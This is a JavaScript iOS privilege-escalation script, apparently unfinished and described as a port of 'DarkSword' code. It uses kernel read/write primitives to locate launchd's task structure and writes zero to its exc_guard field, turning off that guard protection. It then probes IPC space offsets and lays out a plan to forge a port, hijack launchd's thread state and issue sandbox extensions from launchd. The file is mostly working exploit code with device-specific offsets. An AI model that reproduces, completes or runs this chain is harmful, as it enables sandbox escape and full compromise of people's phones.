// escalate_full.js — Full privilege escalation via launchd sandbox token delegation
//
// Port of DarkSword's RemoteCall + Sandbox classes.
// Uses: callSymbol() for Mach IPC, kread64/kwrite64 for kernel R/W,
//       umalloc/uwrite for userspace buffers.

log('=== Full Privilege Escalation ===');

// ---------------------------------------------------------------
// Constants
// ---------------------------------------------------------------
var MACH_PORT_RIGHT_RECEIVE = 1;
var MACH_MSG_TYPE_MAKE_SEND = 20;
var MACH_MSG_TYPE_MOVE_SEND_ONCE = 18;
var MACH_SEND_MSG = 0x1;
var MACH_RCV_MSG = 0x2;
var MACH_RCV_TIMEOUT = 0x100;
var EXC_MASK_GUARD = 0x8000;  // 1 << 15
var EXCEPTION_STATE_IDENTITY64 = 3;
var ARM_THREAD_STATE64 = 6;
var ARM_THREAD_STATE64_COUNT = 68;
var AST_GUARD = 0x1000;
var KERN_SUCCESS = 0;

// Exception message sizes (Mach exception messages are fixed-size)
var EXC_MSG_SIZE = 640;    // Receive buffer size
var EXC_REPLY_SIZE = 296;  // Reply message size

// Guard code encoding
var GUARD_TYPE_MACH_PORT = 1;
var kGUARD_EXC_INVALID_RIGHT = 0x100;

// ---------------------------------------------------------------
// Step 1: Find launchd task + our task
// ---------------------------------------------------------------
var kt = kread64(slide('0xc1bf78'));
var task = kread64(add(kt, '0x30'));
var ourPid = getpid_native();
var launchdTask, launchdProc, ourTask, ourProc;

for (var i = 0; i < 600; i++) {
  if (task == '0x0' || task == kt) break;
  var procRO = kread64(add(task, '0x3e0'));
  if (procRO == '0x0') { task = kread64(add(task, '0x30')); continue; }
  var proc = kread64(procRO);
  if (proc == '0x0' || proc.indexOf('0xffffff') != 0) { task = kread64(add(task, '0x30')); continue; }
  var p = parseInt(kread32(add(proc, '0x60')), 16);
  if (p == 1) { launchdTask = task; launchdProc = proc; }
  if (p == ourPid) { ourTask = task; ourProc = proc; }
  if (launchdTask && ourTask) break;
  task = kread64(add(task, '0x30'));
}

log('launchd task: ' + launchdTask);
log('our task:     ' + ourTask);
log('our pid:      ' + ourPid);

// ---------------------------------------------------------------
// Step 2: Create exception port
// ---------------------------------------------------------------
log('Creating exception port...');
var excPort = mach_port_alloc();
log('Exception port: ' + excPort);
var excPortNum = parseInt(excPort, 16);

// ---------------------------------------------------------------
// Step 3: Find launchd's first thread and disable exc_guard kill
// ---------------------------------------------------------------
var launchdFirstThread = kread64(add(launchdTask, '0x58'));
log('launchd first thread: ' + launchdFirstThread);

// Disable exc_guard kill on launchd task
// DarkSword: read task + excGuard offset, clear the kill bits
var excGuardOffset = '0x624';  // iPhone17 XNU 24.6
var excGuardVal = kread64(add(launchdTask, excGuardOffset));
log('launchd excGuard before: ' + excGuardVal);
// Clear exc_guard kill bit (write 0 to disable all guards)
kwrite64(add(launchdTask, excGuardOffset), '0x0');
log('launchd excGuard after: ' + kread64(add(launchdTask, excGuardOffset)));

// ---------------------------------------------------------------
// Step 4: We need to set exception port on launchd's thread
// This requires a MACH PORT NAME that refers to launchd's thread.
// We need to FORGE a port entry in our IPC space.
// ---------------------------------------------------------------
log('');
log('=== Port Forging ===');

// Find our IPC space
// task+0x320 had a pointer that looked like ipc_space
var ourIpcSpace = kread64(add(ourTask, '0x320'));
log('our ipc_space: ' + ourIpcSpace);

// Read is_table (kalloc array encoded)
// T1SZ_BOOT = 17 for iPhone17, shift = 64-17-1 = 46
// The encoded pointer has the type in the top bits
var isTableRaw = kread64(add(ourIpcSpace, '0x20'));
log('is_table raw: ' + isTableRaw);

// For now, try a simpler approach:
// DarkSword's getPortObject reads the IPC entry for mach_task_self (0x203)
// Each IPC entry is 0x18 bytes (on newer iOS)
// entry = is_table_base + port_name_index * entry_size
// port_name = (index << 8) | generation
// For port 0x203: index = 0x203 >> 8 = 2, but that's the old encoding
// Actually port name encodes as: name = (index << 8) | gen_bits
// index = name >> 8 = 2 for 0x203

// The is_table address needs decoding from the kalloc array
// Decode: strip the top type bits, keep the address bits
// mask = (1 << 46) - 1 = 0x3FFFFFFFFFFF
// But 0x7FFFFFFFFFFFFFFF & 0x3FFFFFFFFFFF = 0x3FFFFFFFFFFF which isn't a valid addr

// Let me check if the value is a real pointer by trying a different decode
// On iOS 18, the kalloc_type_var_view encoding might be different
// Let's just try reading the raw value as a pointer after stripping
// Actually, the table might be at offset +0x28 or +0x30 instead

var v28 = kread64(add(ourIpcSpace, '0x28'));
var v30 = kread64(add(ourIpcSpace, '0x30'));
var v38 = kread64(add(ourIpcSpace, '0x38'));
log('ipc_space+0x28: ' + v28);
log('ipc_space+0x30: ' + v30);
log('ipc_space+0x38: ' + v38);

// TODO: The IPC space structure has changed in XNU 24.
// We need to reverse engineer the exact layout to find is_table.
// For now, report what we have and try the callSymbol approach:
// Use thread_set_exception_ports via callSymbol with a thread port
// obtained via task_threads() on our own task first as a test.

log('');
log('=== Testing thread_set_exception_ports on our own thread ===');
var selfThread = callSymbol('mach_thread_self');
log('mach_thread_self: ' + selfThread);

// Set exception port on our own thread (as a test, won't do anything useful)
// thread_set_exception_ports(thread, mask, port, behavior, flavor)
var kr = callSymbol('thread_set_exception_ports',
  selfThread,           // thread port
  hex(EXC_MASK_GUARD),  // exception mask
  excPort,              // handler port
  hex(EXCEPTION_STATE_IDENTITY64),  // behavior
  hex(ARM_THREAD_STATE64)           // flavor
);
log('thread_set_exception_ports result: ' + kr + ' (0=success)');

if (parseInt(kr, 16) == 0) {
  log('[+] Exception port setup works on our own thread!');
  log('[+] For launchd threads, we need port forging (IPC space manipulation)');
} else {
  log('[-] thread_set_exception_ports failed: ' + kr);
}

log('');
log('=== Next Steps ===');
log('1. Reverse engineer IPC space layout for XNU 24.6 (is_table offset/encoding)');
log('2. Forge a port entry pointing to launchd thread kernel object');
log('3. Call thread_set_exception_ports with forged port');
log('4. Inject EXC_GUARD, catch exception, hijack thread state');
log('5. Call sandbox_extension_issue_file in launchd context');

'escalation_step1_complete';
